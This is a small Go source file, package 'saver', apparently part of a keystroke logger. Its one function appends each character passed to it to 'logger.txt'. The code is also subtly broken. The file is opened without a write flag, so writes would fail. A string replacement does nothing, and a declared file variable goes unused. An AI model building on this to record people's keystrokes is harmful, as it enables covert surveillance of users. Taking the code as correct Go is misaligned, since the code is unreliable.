package saver

import (
	"log"
	"os"
	"strings"
)

var SavedFile *os.File

func SaveCharacterPress(ch rune) {
	file, err := os.OpenFile("logger.txt", os.O_APPEND|os.O_CREATE, 0644)
	if err != nil {
		log.Fatal(err)
	}

	defer file.Close()

	value := string(ch)

	value = strings.Replace(value, " ", " ", -1)

	_, err = file.Write([]byte(value))

	if err != nil {
		log.Fatal(err)
	}

}
